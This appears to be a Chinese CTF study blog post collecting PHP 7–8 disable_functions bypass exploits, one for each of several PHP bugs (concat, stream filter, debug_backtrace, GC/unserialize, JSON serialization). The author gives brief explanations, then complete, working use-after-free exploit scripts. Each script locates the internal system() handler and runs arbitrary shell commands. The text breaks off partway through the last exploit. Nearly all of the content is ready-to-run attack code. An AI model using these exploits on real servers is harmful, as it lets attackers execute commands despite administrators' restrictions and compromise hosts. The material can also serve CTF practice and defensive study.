# PHP7&amp;disable_functions漏洞利用


&gt; 但是还没完全弄懂，所以就是没有写很详细的原理 QAQ
&gt;
&gt; 之后学了会持续更新

# PHP7&amp;disable_functions漏洞利用

&gt; 写这个是因为当时做题遇到了[GKCTF 2020]CheckIN这个题感觉这个里面用的漏洞和exp都不熟
&gt;
&gt; 所以想记录一下

## php-concat-bypass

&gt; 用于php 7.3-8.1

### 原理

利用漏洞[bug #81705](https://bugs.php.net/bug.php?id=81705)绕过disable_functions

字符串连接符中有一个错误，当参数为数组时会触发错误处理，如果在错误处理回调中删除了相关资源，会造成UAF

### poc

```
&lt;?php

$my_var = str_repeat(&#34;a&#34;, 1);
set_error_handler(
    function() use(&amp;$my_var) {
        echo(&#34;error\n&#34;);
        $my_var = 0x123;
    }
);
$my_var .= [0];

?&gt;
```

### exp

```
&lt;?php

# PHP 7.3-8.1 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=81705
# 
# This exploit should work on all PHP 7.3-8.1 versions
# released as of 2022-01-07
#
# Author: https://github.com/mm0r1

new Pwn(&#34;uname -a&#34;);	# 此处需要根据需要修改

class Helper { public $a, $b, $c; }
class Pwn {
    const LOGGING = false;
    const CHUNK_DATA_SIZE = 0x60;
    const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE &#43; 0x20 : self::CHUNK_DATA_SIZE;
    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;

    const HT_SIZE = 0x118;
    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

    public function __construct($cmd) {
        for($i = 0; $i &lt; 10; $i&#43;&#43;) {
            $groom[] = self::alloc(self::STRING_SIZE);
            $groom[] = self::alloc(self::HT_STRING_SIZE);
        }
        
        $concat_str_addr = self::str2ptr($this-&gt;heap_leak(), 16);
        $fill = self::alloc(self::STRING_SIZE);

        $this-&gt;abc = self::alloc(self::STRING_SIZE);
        $abc_addr = $concat_str_addr &#43; self::CHUNK_SIZE;
        self::log(&#34;abc @ 0x%x&#34;, $abc_addr);

        $this-&gt;free($abc_addr);
        $this-&gt;helper = new Helper;
        if(strlen($this-&gt;abc) &lt; 0x1337) {
            self::log(&#34;uaf failed&#34;);
            return;
        }

        $this-&gt;helper-&gt;a = &#34;leet&#34;;
        $this-&gt;helper-&gt;b = function($x) {};
        $this-&gt;helper-&gt;c = 0xfeedface;

        $helper_handlers = $this-&gt;rel_read(0);
        self::log(&#34;helper handlers @ 0x%x&#34;, $helper_handlers);

        $closure_addr = $this-&gt;rel_read(0x20);
        self::log(&#34;real closure @ 0x%x&#34;, $closure_addr);

        $closure_ce = $this-&gt;read($closure_addr &#43; 0x10);
        self::log(&#34;closure class_entry @ 0x%x&#34;, $closure_ce);
        
        $basic_funcs = $this-&gt;get_basic_funcs($closure_ce);
        self::log(&#34;basic_functions @ 0x%x&#34;, $basic_funcs);

        $zif_system = $this-&gt;get_system($basic_funcs);
        self::log(&#34;zif_system @ 0x%x&#34;, $zif_system);

        $fake_closure_off = 0x70;
        for($i = 0; $i &lt; 0x138; $i &#43;= 8) {
            $this-&gt;rel_write($fake_closure_off &#43; $i, $this-&gt;read($closure_addr &#43; $i));
        }
        $this-&gt;rel_write($fake_closure_off &#43; 0x38, 1, 4);
        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this-&gt;rel_write($fake_closure_off &#43; $handler_offset, $zif_system);

        $fake_closure_addr = $abc_addr &#43; $fake_closure_off &#43; 0x18;
        self::log(&#34;fake closure @ 0x%x&#34;, $fake_closure_addr);

        $this-&gt;rel_write(0x20, $fake_closure_addr);
        ($this-&gt;helper-&gt;b)($cmd);

        $this-&gt;rel_write(0x20, $closure_addr);
        unset($this-&gt;helper-&gt;b);
    }

    private function heap_leak() {
        $arr = [[], []];
        set_error_handler(function() use (&amp;$arr, &amp;$buf) {
            $arr = 1;
            $buf = str_repeat(&#34;\x00&#34;, self::HT_STRING_SIZE);
        });
        $arr[1] .= self::alloc(self::STRING_SIZE - strlen(&#34;Array&#34;));
        return $buf;
    }

    private function free($addr) {
        $payload = pack(&#34;Q*&#34;, 0xdeadbeef, 0xcafebabe, $addr);
        $payload .= str_repeat(&#34;A&#34;, self::HT_STRING_SIZE - strlen($payload));
        
        $arr = [[], []];
        set_error_handler(function() use (&amp;$arr, &amp;$buf, &amp;$payload) {
            $arr = 1;
            $buf = str_repeat($payload, 1);
        });
        $arr[1] .= &#34;x&#34;;
    }

    private function rel_read($offset) {
        return self::str2ptr($this-&gt;abc, $offset);
    }

    private function rel_write($offset, $value, $n = 8) {
        for ($i = 0; $i &lt; $n; $i&#43;&#43;) {
            $this-&gt;abc[$offset &#43; $i] = chr($value &amp; 0xff);
            $value &gt;&gt;= 8;
        }
    }

    private function read($addr, $n = 8) {
        $this-&gt;rel_write(0x10, $addr - 0x10);
        $value = strlen($this-&gt;helper-&gt;a);
        if($n !== 8) { $value &amp;= (1 &lt;&lt; ($n &lt;&lt; 3)) - 1; }
        return $value;
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this-&gt;read($addr);
            $f_name = $this-&gt;read($f_entry, 6);
            if($f_name === 0x6d6574737973) {
                return $this-&gt;read($addr &#43; 8);
            }
            $addr &#43;= 0x20;
        } while($f_entry !== 0);
    }

    private function get_basic_funcs($addr) {
        while(true) {
            // In rare instances the standard module might lie after the addr we&#39;re starting
            // the search from. This will result in a SIGSGV when the search reaches an unmapped page.
            // In that case, changing the direction of the search should fix the crash.
            // $addr &#43;= 0x10;
            $addr -= 0x10;
            if($this-&gt;read($addr, 4) === 0xA8 &amp;&amp;
                in_array($this-&gt;read($addr &#43; 4, 4),
                    [20180731, 20190902, 20200930, 20210902])) {
                $module_name_addr = $this-&gt;read($addr &#43; 0x20);
                $module_name = $this-&gt;read($module_name_addr);
                if($module_name === 0x647261646e617473) {
                    self::log(&#34;standard module @ 0x%x&#34;, $addr);
                    return $this-&gt;read($addr &#43; 0x28);
                }
            }
        }
    }

    private function log($format, $val = &#34;&#34;) {
        if(self::LOGGING) {
            printf(&#34;{$format}\n&#34;, $val);
        }
    }

    static function alloc($size) {
        return str_shuffle(str_repeat(&#34;A&#34;, $size));
    }

    static function str2ptr($str, $p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j &gt;= 0; $j--) {
            $address &lt;&lt;= 8;
            $address |= ord($str[$p &#43; $j]);
        }
        return $address;
    }
}

?&gt;
```

## php-filter-bypass

&gt; php 7.0-8.0.

### 原理

通过漏洞[bug #54350](https://bugs.php.net/bug.php?id=54350)绕过disable_functions

### exp

```
&lt;?php
# PHP 7.0-8.0 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=54350
# 
# This exploit should work on all PHP 7.0-8.0 versions
# released as of 2021-10-06
#
# Author: https://github.com/mm0r1

pwn(&#39;uname -a&#39;);

function pwn($cmd) {
    define(&#39;LOGGING&#39;, false);
    define(&#39;CHUNK_DATA_SIZE&#39;, 0x60);
    define(&#39;CHUNK_SIZE&#39;, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE &#43; 0x20 : CHUNK_DATA_SIZE);
    define(&#39;FILTER_SIZE&#39;, ZEND_DEBUG_BUILD ? 0x70 : 0x50);
    define(&#39;STRING_SIZE&#39;, CHUNK_DATA_SIZE - 0x18 - 1);
    define(&#39;CMD&#39;, $cmd);
    for($i = 0; $i &lt; 10; $i&#43;&#43;) {
        $groom[] = Pwn::alloc(STRING_SIZE);
    }
    stream_filter_register(&#39;pwn_filter&#39;, &#39;Pwn&#39;);
    $fd = fopen(&#39;php://memory&#39;, &#39;w&#39;);
    stream_filter_append($fd,&#39;pwn_filter&#39;);
    fwrite($fd, &#39;x&#39;);
}

class Helper { public $a, $b, $c; }
class Pwn extends php_user_filter {
    private $abc, $abc_addr;
    private $helper, $helper_addr, $helper_off;
    private $uafp, $hfp;

    public function filter($in, $out, &amp;$consumed, $closing) {
        if($closing) return;
        stream_bucket_make_writeable($in);
        $this-&gt;filtername = Pwn::alloc(STRING_SIZE);
        fclose($this-&gt;stream);
        $this-&gt;go();
        return PSFS_PASS_ON;
    }

    private function go() {
        $this-&gt;abc = &amp;$this-&gt;filtername;

        $this-&gt;make_uaf_obj();

        $this-&gt;helper = new Helper;
        $this-&gt;helper-&gt;b = function($x) {};

        $this-&gt;helper_addr = $this-&gt;str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;
        $this-&gt;log(&#34;helper @ 0x%x&#34;, $this-&gt;helper_addr);

        $this-&gt;abc_addr = $this-&gt;helper_addr - CHUNK_SIZE;
        $this-&gt;log(&#34;abc @ 0x%x&#34;, $this-&gt;abc_addr);

        $this-&gt;helper_off = $this-&gt;helper_addr - $this-&gt;abc_addr - 0x18;

        $helper_handlers = $this-&gt;str2ptr(CHUNK_SIZE);
        $this-&gt;log(&#34;helper handlers @ 0x%x&#34;, $helper_handlers);

        $this-&gt;prepare_leaker();

        $binary_leak = $this-&gt;read($helper_handlers &#43; 8);
        $this-&gt;log(&#34;binary leak @ 0x%x&#34;, $binary_leak);
        $this-&gt;prepare_cleanup($binary_leak);

        $closure_addr = $this-&gt;str2ptr($this-&gt;helper_off &#43; 0x38);
        $this-&gt;log(&#34;real closure @ 0x%x&#34;, $closure_addr);

        $closure_ce = $this-&gt;read($closure_addr &#43; 0x10);
        $this-&gt;log(&#34;closure class_entry @ 0x%x&#34;, $closure_ce);

        $basic_funcs = $this-&gt;get_basic_funcs($closure_ce);
        $this-&gt;log(&#34;basic_functions @ 0x%x&#34;, $basic_funcs);

        $zif_system = $this-&gt;get_system($basic_funcs);
        $this-&gt;log(&#34;zif_system @ 0x%x&#34;, $zif_system);

        $fake_closure_off = $this-&gt;helper_off &#43; CHUNK_SIZE * 2;
        for($i = 0; $i &lt; 0x138; $i &#43;= 8) {
            $this-&gt;write($fake_closure_off &#43; $i, $this-&gt;read($closure_addr &#43; $i));
        }
        $this-&gt;write($fake_closure_off &#43; 0x38, 1, 4);

        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this-&gt;write($fake_closure_off &#43; $handler_offset, $zif_system);

        $fake_closure_addr = $this-&gt;helper_addr &#43; $fake_closure_off - $this-&gt;helper_off;
        $this-&gt;write($this-&gt;helper_off &#43; 0x38, $fake_closure_addr);
        $this-&gt;log(&#34;fake closure @ 0x%x&#34;, $fake_closure_addr);

        $this-&gt;cleanup();
        ($this-&gt;helper-&gt;b)(CMD);
    }

    private function make_uaf_obj() {
        $this-&gt;uafp = fopen(&#39;php://memory&#39;, &#39;w&#39;);
        fwrite($this-&gt;uafp, pack(&#39;QQQ&#39;, 1, 0, 0xDEADBAADC0DE));
        for($i = 0; $i &lt; STRING_SIZE; $i&#43;&#43;) {
            fwrite($this-&gt;uafp, &#34;\x00&#34;);
        }
    }

    private function prepare_leaker() {
        $str_off = $this-&gt;helper_off &#43; CHUNK_SIZE &#43; 8;
        $this-&gt;write($str_off, 2);
        $this-&gt;write($str_off &#43; 0x10, 6);

        $val_off = $this-&gt;helper_off &#43; 0x48;
        $this-&gt;write($val_off, $this-&gt;helper_addr &#43; CHUNK_SIZE &#43; 8);
        $this-&gt;write($val_off &#43; 8, 0xA);
    }

    private function prepare_cleanup($binary_leak) {
        $ret_gadget = $binary_leak;
        do {
            --$ret_gadget;
        } while($this-&gt;read($ret_gadget, 1) !== 0xC3);
        $this-&gt;log(&#34;ret gadget = 0x%x&#34;, $ret_gadget);
        $this-&gt;write(0, $this-&gt;abc_addr &#43; 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60));
        $this-&gt;write(8, $ret_gadget);
    }

    private function read($addr, $n = 8) {
        $this-&gt;write($this-&gt;helper_off &#43; CHUNK_SIZE &#43; 16, $addr - 0x10);
        $value = strlen($this-&gt;helper-&gt;c);
        if($n !== 8) { $value &amp;= (1 &lt;&lt; ($n &lt;&lt; 3)) - 1; }
        return $value;
    }

    private function write($p, $v, $n = 8) {
        for($i = 0; $i &lt; $n; $i&#43;&#43;) {
            $this-&gt;abc[$p &#43; $i] = chr($v &amp; 0xff);
            $v &gt;&gt;= 8;
        }
    }

    private function get_basic_funcs($addr) {
        while(true) {
            // In rare instances the standard module might lie after the addr we&#39;re starting
            // the search from. This will result in a SIGSGV when the search reaches an unmapped page.
            // In that case, changing the direction of the search should fix the crash.
            // $addr &#43;= 0x10;
            $addr -= 0x10;
            if($this-&gt;read($addr, 4) === 0xA8 &amp;&amp;
                in_array($this-&gt;read($addr &#43; 4, 4),
                    [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) {
                $module_name_addr = $this-&gt;read($addr &#43; 0x20);
                $module_name = $this-&gt;read($module_name_addr);
                if($module_name === 0x647261646e617473) {
                    $this-&gt;log(&#34;standard module @ 0x%x&#34;, $addr);
                    return $this-&gt;read($addr &#43; 0x28);
                }
            }
        }
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this-&gt;read($addr);
            $f_name = $this-&gt;read($f_entry, 6);
            if($f_name === 0x6d6574737973) {
                return $this-&gt;read($addr &#43; 8);
            }
            $addr &#43;= 0x20;
        } while($f_entry !== 0);
    }

    private function cleanup() {
        $this-&gt;hfp = fopen(&#39;php://memory&#39;, &#39;w&#39;);
        fwrite($this-&gt;hfp, pack(&#39;QQ&#39;, 0, $this-&gt;abc_addr));
        for($i = 0; $i &lt; FILTER_SIZE - 0x10; $i&#43;&#43;) {
            fwrite($this-&gt;hfp, &#34;\x00&#34;);
        }
    }

    private function str2ptr($p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j &gt;= 0; $j--) {
            $address &lt;&lt;= 8;
            $address |= ord($this-&gt;abc[$p &#43; $j]);
        }
        return $address;
    }

    private function ptr2str($ptr, $n = 8) {
        $out = &#39;&#39;;
        for ($i = 0; $i &lt; $n; $i&#43;&#43;) {
            $out .= chr($ptr &amp; 0xff);
            $ptr &gt;&gt;= 8;
        }
        return $out;
    }

    private function log($format, $val = &#39;&#39;) {
        if(LOGGING) {
            printf(&#34;{$format}\n&#34;, $val);
        }
    }

    static function alloc($size) {
        return str_shuffle(str_repeat(&#39;A&#39;, $size));
    }
}
?&gt;
```

## php7-backtrace-bypass

&gt; php 7.0-7.4

### 原理

通过漏洞[bug #76047](https://bugs.php.net/bug.php?id=76047)来绕过

黑名单中添加pcntl相关函数可以实现禁用

### exp

```
&lt;?php

# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=76047
# debug_backtrace() returns a reference to a variable 
# that has been destroyed, causing a UAF vulnerability.
#
# This exploit should work on all PHP 7.0-7.4 versions
# released as of 30/01/2020.
#
# Author: https://github.com/mm0r1

pwn(&#34;uname -a&#34;);

function pwn($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this-&gt;a);
            $backtrace = (new Exception)-&gt;getTrace(); # ;)
            if(!isset($backtrace[1][&#39;args&#39;])) { # PHP &gt;= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&amp;$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j &gt;= 0; $j--) {
            $address &lt;&lt;= 8;
            $address |= ord($str[$p&#43;$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = &#34;&#34;;
        for ($i=0; $i &lt; $m; $i&#43;&#43;) {
            $out .= chr($ptr &amp; 0xff);
            $ptr &gt;&gt;= 8;
        }
        return $out;
    }

    function write(&amp;$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i &lt; $n; $i&#43;&#43;) {
            $str[$p &#43; $i] = chr($v &amp; 0xff);
            $v &gt;&gt;= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr &#43; $p - 0x10);
        $leak = strlen($helper-&gt;a);
        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i &lt; $e_phnum; $i&#43;&#43;) {
            $header = $base &#43; $e_phoff &#43; $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base &#43; $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i &lt; $data_size / 8; $i&#43;&#43;) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
                $deref = leak($leak);
                # &#39;constant&#39; constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i &#43; 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
                $deref = leak($leak);
                # &#39;bin2hex&#39; constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr &#43; $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak &amp; 0xfffffffffffff000;
        for($i = 0; $i &lt; 0x1000; $i&#43;&#43;) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr &#43; 8);
            }
            $addr &#43;= 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(str_repeat(&#39;A&#39;, 79));
        $vuln = new Vuln();
        $vuln-&gt;a = $arg;
    }

    if(stristr(PHP_OS, &#39;WIN&#39;)) {
        die(&#39;This PoC is for *nix systems only.&#39;);
    }

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i &lt; $n_alloc; $i&#43;&#43;)
        $contiguous[] = str_shuffle(str_repeat(&#39;A&#39;, 79));

    trigger_uaf(&#39;x&#39;);
    $abc = $backtrace[1][&#39;args&#39;][0];

    $helper = new Helper;
    $helper-&gt;b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die(&#34;UAF failed&#34;);
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr &#43; 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die(&#34;Couldn&#39;t determine binary base address&#34;);
    }

    if(!($elf = parse_elf($base))) {
        die(&#34;Couldn&#39;t parse ELF header&#34;);
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die(&#34;Couldn&#39;t get basic_functions address&#34;);
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die(&#34;Couldn&#39;t get zif_system address&#34;);
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i &lt; 0x110; $i &#43;= 8) {
        write($abc, $fake_obj_offset &#43; $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr &#43; $fake_obj_offset);
    write($abc, 0xd0 &#43; 0x38, 1, 4); # internal func type
    write($abc, 0xd0 &#43; 0x68, $zif_system); # internal func handler

    ($helper-&gt;b)($cmd);
    exit();
}
```

## php7-gc-bypass

&gt; php7.0-7.3
&gt;
&gt; Bug patched in php 7.4

### 原理

通过利用这个 [bug #72530](https://bugs.php.net/bug.php?id=72530) 绕过disable_functions

### exp

```
&lt;?php

# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=72530
#
# This exploit should work on all PHP 7.0-7.3 versions
#
# Author: https://github.com/mm0r1

pwn(&#34;uname -a&#34;);

function pwn($cmd) {
    global $abc, $helper;

    function str2ptr(&amp;$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j &gt;= 0; $j--) {
            $address &lt;&lt;= 8;
            $address |= ord($str[$p&#43;$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = &#34;&#34;;
        for ($i=0; $i &lt; $m; $i&#43;&#43;) {
            $out .= chr($ptr &amp; 0xff);
            $ptr &gt;&gt;= 8;
        }
        return $out;
    }

    function write(&amp;$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i &lt; $n; $i&#43;&#43;) {
            $str[$p &#43; $i] = chr($v &amp; 0xff);
            $v &gt;&gt;= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr &#43; $p - 0x10);
        $leak = strlen($helper-&gt;a);
        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i &lt; $e_phnum; $i&#43;&#43;) {
            $header = $base &#43; $e_phoff &#43; $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base &#43; $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i &lt; $data_size / 8; $i&#43;&#43;) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
                $deref = leak($leak);
                # &#39;constant&#39; constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i &#43; 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
                $deref = leak($leak);
                # &#39;bin2hex&#39; constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr &#43; $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak &amp; 0xfffffffffffff000;
        for($i = 0; $i &lt; 0x1000; $i&#43;&#43;) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr &#43; 8);
            }
            $addr &#43;= 0x20;
        } while($f_entry != 0);
        return false;
    }

    class ryat {
        var $ryat;
        var $chtg;
        
        function __destruct()
        {
            $this-&gt;chtg = $this-&gt;ryat;
            $this-&gt;ryat = 1;
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    if(stristr(PHP_OS, &#39;WIN&#39;)) {
        die(&#39;This PoC is for *nix systems only.&#39;);
    }

    $n_alloc = 10; # increase this value if you get segfaults

    $contiguous = [];
    for($i = 0; $i &lt; $n_alloc; $i&#43;&#43;)
        $contiguous[] = str_repeat(&#39;A&#39;, 79);

    $poc = &#39;a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:&#34;ryat&#34;:2:{s:4:&#34;ryat&#34;;R:3;s:4:&#34;chtg&#34;;i:2;}}i:1;i:3;i:2;R:5;}&#39;;
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper-&gt;b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die(&#34;UAF failed&#34;);
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr &#43; 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die(&#34;Couldn&#39;t determine binary base address&#34;);
    }

    if(!($elf = parse_elf($base))) {
        die(&#34;Couldn&#39;t parse ELF header&#34;);
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die(&#34;Couldn&#39;t get basic_functions address&#34;);
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die(&#34;Couldn&#39;t get zif_system address&#34;);
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i &lt; 0x110; $i &#43;= 8) {
        write($abc, $fake_obj_offset &#43; $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr &#43; $fake_obj_offset);
    write($abc, 0xd0 &#43; 0x38, 1, 4); # internal func type
    write($abc, 0xd0 &#43; 0x68, $zif_system); # internal func handler

    ($helper-&gt;b)($cmd);

    exit();
}
```

## php-json-bypass

&gt; 7.1-7.3 released before 30.05.2019.

### 原理

通过利用这个漏洞 [bug #77843](https://bugs.php.net/bug.php?id=77843) 绕过disable_functions

### exp

```
&lt;?php

$cmd = &#34;id&#34;;

$n_alloc = 10; # increase this value if you get segfaults

class MySplFixedArray extends SplFixedArray {
    public static $leak;
}

class Z implements JsonSerializable {
    public function write(&amp;$str, $p, $v, $n = 8) {
      $i = 0;
      for($i = 0; $i &lt; $n; $i&#43;&#43;) {
        $str[$p &#43; $i] = chr($v &amp; 0xff);
        $v &gt;&gt;= 8;
      }
    }

    public function str2ptr(&amp;$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j &gt;= 0; $j--) {
            $address &lt;&lt;= 8;
            $address |= ord($str[$p&#43;$j]);
        }
        return $address;
    }

    public function ptr2str($ptr, $m = 8) {
        $out = &#34;&#34;;
        for ($i=0; $i &lt; $m; $i&#43;&#43;) {
            $out .= chr($ptr &amp; 0xff);
            $ptr &gt;&gt;= 8;
        }
        return $out;
    }

    # unable to leak ro segments
    public function leak1($addr) {
        global $spl1;

        $this-&gt;write($this-&gt;abc, 8, $addr - 0x10);
        return strlen(get_class($spl1));
    }

    # the real deal
    public function leak2($addr, $p = 0, $s = 8) {
        global $spl1, $fake_tbl_off;

        # fake reference zval
        $this-&gt;write($this-&gt;abc, $fake_tbl_off &#43; 0x10, 0xdeadbeef); # gc_refcounted
        $this-&gt;write($this-&gt;abc, $fake_tbl_off &#43; 0x18, $addr &#43; $p - 0x10); # zval
        $this-&gt;write($this-&gt;abc, $fake_tbl_off &#43; 0x20, 6); # type (string)

        $leak = strlen($spl1::$leak);
        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }

        return $leak;
    }

    public function parse_elf($base) {
        $e_type = $this-&gt;leak2($base, 0x10, 2);

        $e_phoff = $this-&gt;leak2($base, 0x20);
        $e_phentsize = $this-&gt;leak2($base, 0x36, 2);
        $e_phnum = $this-&gt;leak2($base, 0x38, 2);

        for($i = 0; $i &lt; $e_phnum; $i&#43;&#43;) {
            $header = $base &#43; $e_phoff &#43; $i * $e_phentsize;
            $p_type  = $this-&gt;leak2($header, 0, 4);
            $p_flags = $this-&gt;leak2($header, 4, 4);
            $p_vaddr = $this-&gt;leak2($header, 0x10);
            $p_memsz = $this-&gt;leak2($header, 0x28);

            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base &#43; $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    public function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i &lt; $data_size / 8; $i&#43;&#43;) {
            $leak = $this-&gt;leak2($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
                $deref = $this-&gt;leak2($leak);
                # &#39;constant&#39; constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

